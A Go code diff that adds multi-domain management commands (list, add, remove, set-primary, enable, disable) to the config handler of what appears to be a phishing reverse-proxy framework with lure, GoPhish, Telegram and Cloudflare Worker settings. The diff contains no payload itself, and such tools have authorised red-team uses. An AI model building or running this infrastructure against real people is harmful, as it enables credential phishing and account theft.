@@ -258,16 +258,47 @@ func (t *Terminal) handleConfig(args []string) error {
 		
 		lureStrategy := t.cfg.GetLureGenerationStrategy()
 
-		keys := []string{"domain", "external_ipv4", "bind_ipv4", "https_port", "dns_port", "unauth_url", "autocert", "lure_strategy", "gophish admin_url", "gophish api_key", "gophish insecure", "telegram bot_token", "telegram chat_id", "telegram enabled", "cloudflare_worker account_id", "cloudflare_worker api_token", "cloudflare_worker zone_id", "cloudflare_worker subdomain", "cloudflare_worker enabled"}
-		vals := []string{t.cfg.general.Domain, t.cfg.general.ExternalIpv4, t.cfg.general.BindIpv4, strconv.Itoa(t.cfg.general.HttpsPort), strconv.Itoa(t.cfg.general.DnsPort), t.cfg.general.UnauthUrl, autocertOnOff, lureStrategy, t.cfg.GetGoPhishAdminUrl(), t.cfg.GetGoPhishApiKey(), gophishInsecure, t.cfg.GetTelegramBotToken(), t.cfg.GetTelegramChatID(), telegramEnabled, t.cfg.cloudflareWorkerConfig.AccountID, t.cfg.cloudflareWorkerConfig.APIToken, t.cfg.cloudflareWorkerConfig.ZoneID, t.cfg.cloudflareWorkerConfig.WorkerSubdomain, cfWorkerEnabled}
+		keys := []string{"domain", "primary_domain", "domains_count", "external_ipv4", "bind_ipv4", "https_port", "dns_port", "unauth_url", "autocert", "lure_strategy", "gophish admin_url", "gophish api_key", "gophish insecure", "telegram bot_token", "telegram chat_id", "telegram enabled", "cloudflare_worker account_id", "cloudflare_worker api_token", "cloudflare_worker zone_id", "cloudflare_worker subdomain", "cloudflare_worker enabled"}
+		primaryDomain := t.cfg.GetPrimaryDomain()
+		domainsCount := strconv.Itoa(len(t.cfg.GetDomains()))
+		vals := []string{t.cfg.general.Domain, primaryDomain, domainsCount, t.cfg.general.ExternalIpv4, t.cfg.general.BindIpv4, strconv.Itoa(t.cfg.general.HttpsPort), strconv.Itoa(t.cfg.general.DnsPort), t.cfg.general.UnauthUrl, autocertOnOff, lureStrategy, t.cfg.GetGoPhishAdminUrl(), t.cfg.GetGoPhishApiKey(), gophishInsecure, t.cfg.GetTelegramBotToken(), t.cfg.GetTelegramChatID(), telegramEnabled, t.cfg.cloudflareWorkerConfig.AccountID, t.cfg.cloudflareWorkerConfig.APIToken, t.cfg.cloudflareWorkerConfig.ZoneID, t.cfg.cloudflareWorkerConfig.WorkerSubdomain, cfWorkerEnabled}
 		log.Printf("\n%s\n", AsRows(keys, vals))
 		return nil
 	} else if pn == 2 {
 		switch args[0] {
 		case "domain":
+			// Legacy: set primary domain (backward compatibility)
 			t.cfg.SetBaseDomain(args[1])
 			t.cfg.ResetAllSites()
 			t.manageCertificates(false)
+			return nil
+		case "domains":
+			// List all domains
+			domains := t.cfg.GetDomains()
+			if len(domains) == 0 {
+				log.Info("no domains configured")
+				return nil
+			}
+			log.Info("\nConfigured Domains:")
+			log.Info("─────────────────────────────────────────────────────────────")
+			for i, d := range domains {
+				status := "disabled"
+				if d.Enabled {
+					status = "enabled"
+				}
+				primary := ""
+				if d.IsPrimary {
+					primary = " [PRIMARY]"
+				}
+				log.Info("%d. %s (%s)%s", i+1, d.Domain, status, primary)
+				if d.Description != "" {
+					log.Info("   Description: %s", d.Description)
+				}
+				if d.AddedAt != "" {
+					log.Info("   Added: %s", d.AddedAt)
+				}
+			}
+			log.Info("─────────────────────────────────────────────────────────────")
 			return nil
 		case "ipv4":
 			t.cfg.SetServerExternalIP(args[1])
@@ -347,6 +378,60 @@ func (t *Terminal) handleConfig(args []string) error {
 				} else {
 					log.Success("telegram: test message sent successfully")
 				}
+				return nil
+			}
+		}
+	} else if pn == 3 {
+		switch args[0] {
+		case "domains":
+			switch args[1] {
+			case "add":
+				description := ""
+				err := t.cfg.AddDomain(args[2], description)
+				if err != nil {
+					return err
+				}
+				t.manageCertificates(false)
+				return nil
+			case "remove":
+				err := t.cfg.RemoveDomain(args[2])
+				if err != nil {
+					return err
+				}
+				t.manageCertificates(false)
+				return nil
+			case "set-primary":
+				err := t.cfg.SetPrimaryDomain(args[2])
+				if err != nil {
+					return err
+				}
+				t.manageCertificates(false)
+				return nil
+			case "enable":
+				err := t.cfg.EnableDomain(args[2], true)
+				if err != nil {
+					return err
+				}
+				return nil
+			case "disable":
+				err := t.cfg.EnableDomain(args[2], false)
+				if err != nil {
+					return err
+				}
+				return nil
+			}
+		}
+	} else if pn == 4 {
+		switch args[0] {
+		case "domains":
+			switch args[1] {
+			case "add":
+				description := args[3]
+				err := t.cfg.AddDomain(args[2], description)
+				if err != nil {
+					return err
+				}
+				t.manageCertificates(false)
 				return nil
 			}
 		}
